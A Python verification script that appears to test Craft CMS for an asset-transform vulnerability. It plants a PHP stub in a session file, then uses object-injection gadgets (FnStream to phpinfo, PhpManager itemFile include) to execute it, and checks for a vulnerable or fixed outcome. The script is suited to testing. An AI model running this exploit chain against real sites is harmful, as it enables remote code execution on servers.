"""Native session-storage and image-transform inclusion controls."""
from pathlib import Path
import base64
import hashlib
import http.cookiejar
import json
import os
import re
import urllib.parse
import urllib.request


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, url):
        return None


def control(core, baseline, carrier_source):
    checks = []
    record = {'owner_execution_invoked': False, 'pid': os.getpid(), 'checks': checks}
    carrier = Path('/app/web/module-target-session-config-' + str(os.getpid()) + '.php')
    proof = Path('/tmp/module-target-craftasset-session-' + str(os.getpid()))
    owned_sessions = []
    carrier_created = False
    proof_absent = not proof.exists()

    def check(name, value):
        checks.append({'name': name, 'passed': bool(value)})
        if not value:
            raise AssertionError(name)

    def session_file(root, sid):
        check('session-id-character-contract', re.fullmatch(r'[A-Za-z0-9,-]{1,128}', sid) is not None)
        matches = list(root.rglob('sess_' + sid))
        check('one-native-session-file', len(matches) == 1)
        path = matches[0]
        check('native-session-file-scope', path.resolve().is_relative_to(root.resolve()) and path.stat().st_uid == 82)
        return path

    try:
        check('native-session-paths-absent', not carrier.exists() and proof_absent)
        carrier.write_bytes(carrier_source)
        carrier_created = True
        status, _, body = core.request('native-session-configuration', '/' + carrier.name)
        config = json.loads(body)
        record['configuration'] = config
        check('native-session-config-sapi', status == 200 and config['sapi'] == 'fpm-fcgi' and config['uid'] == 82)
        check('native-file-session-handler', config['handler'] == 'files')
        raw_root = config['component_path'] or config['ini_path'] or config['temporary_directory']
        root = Path(raw_root.rsplit(';', 1)[-1])
        check('native-session-root-directory', root.is_absolute() and root.is_dir())
        before = {path.resolve(): hashlib.sha256(path.read_bytes()).hexdigest() for path in root.rglob('sess_*') if path.is_file()}
        record['existing_sessions_before'] = {str(path): digest for path, digest in before.items()}
        jar = http.cookiejar.CookieJar()
        client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())
        token = 'module-target-session-marker-' + str(os.getpid())
        contents = 'module-target-native-session-proof'
        stub = "<?=file_put_contents('" + str(proof) + "','" + contents + "');print('" + token + "');die()?>"
        check('native-stub-has-no-request-line-whitespace', not any(value in stub for value in [' ', '\r', '\n']))
        status, _, body = core.request('native-anonymous-return-url', '/index.php?p=admin/dashboard&moduleTargetNative=' + stub, client=client)
        check('native-dashboard-redirect', status == 302)
        sids = [cookie.value for cookie in jar if cookie.name == config['name']]
        check('native-session-cookie-created', len(sids) == 1)
        sid = sids[0]
        path = session_file(root, sid)
        check('native-session-newly-created', path.resolve() not in before)
        owned_sessions.append(path)
        source = path.read_bytes()
        record['return_url_session'] = {'path': str(path), 'uid': path.stat().st_uid, 'sha256': hashlib.sha256(source).hexdigest(), 'bytes_base64': base64.b64encode(source).decode(), 'cookie_name': config['name'], 'sid': sid}
        check('native-session-retains-raw-stub', stub.encode() in source)
        status, _, body = core.request('native-session-login-csrf', '/admin/login', client=client)
        inputs = core.Inputs()
        inputs.feed(body.decode())
        csrf_values = [value for name, value in inputs.values.items() if 'CSRF' in name]
        check('native-session-csrf', status == 200 and len(csrf_values) == 1)
        info_payload = {'assetId': baseline['asset']['id'], 'handle': {'width': 2, 'height': 2, 'as moduleTargetInformation': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'GuzzleHttp\\Psr7\\FnStream', '__construct()': [[]], '_fn_close': 'phpinfo'}}}
        info_status, _, info_body = core.request('native-transform-phpinfo', '/index.php?p=admin/actions/assets/generate-transform', data=json.dumps(info_payload).encode(), client=client, content_type='application/json', headers={'X-CSRF-Token': csrf_values[0]})
        exposed = all(marker in info_body for marker in [b'phpinfo()', b'session.save_path', b'upload_tmp_dir'])
        record['phpinfo'] = {'status': info_status, 'bytes': len(info_body), 'sha256': hashlib.sha256(info_body).hexdigest(), 'exposed': exposed}
        check('native-phpinfo-or-fixed-denial', exposed == core.PROFILE['asset_vulnerable'])
        payload = {'assetId': baseline['asset']['id'], 'handle': {'width': 2, 'height': 2, 'as moduleTargetNative': {'class': 'craft\\behaviors\\FieldLayoutBehavior', '__class': 'yii\\rbac\\PhpManager', '__construct()': [{'itemFile': str(path)}]}}}
        status, _, body = core.request('native-transform-session-include', '/index.php?p=actions/assets/generate-transform', data=json.dumps(payload).encode(), client=client, content_type='application/json', headers={'X-CSRF-Token': csrf_values[0]})
        record['transform'] = {'status': status, 'response_sha256': hashlib.sha256(body).hexdigest(), 'marker_count': body.count(token.encode()), 'proof_exists': proof.is_file()}
        positive = core.PROFILE['asset_vulnerable']
        check('native-session-include-or-fixed-denial', proof.is_file() == positive)
        if positive:
            record['proof'] = {'uid': proof.stat().st_uid, 'bytes_base64': base64.b64encode(proof.read_bytes()).decode()}
            check('native-session-exact-command-proof', proof.stat().st_uid == 82 and proof.read_bytes() == contents.encode() and body.count(token.encode()) == 1)
        else:
            check('fixed-handle-rejection-without-proof', status == 500 and b'Invalid transform handle.' in body and not proof.exists())
        record['passed'] = True
        return record
    finally:
        if carrier_created:
            carrier.unlink(missing_ok=True)
        if proof_absent:
            proof.unlink(missing_ok=True)
        for path in owned_sessions:
            path.unlink(missing_ok=True)
        record['cleanup'] = {'carrier_absent': not carrier.exists(), 'proof_absent': not proof.exists(), 'owned_sessions_absent': all(not path.exists() for path in owned_sessions)}
        if 'before' in locals():
            record['existing_sessions_preserved'] = all(path.is_file() and hashlib.sha256(path.read_bytes()).hexdigest() == digest for path, digest in before.items())
        Path('/tmp/module-target-native-session-control.json').write_text(json.dumps(record, indent=2) + '\n')
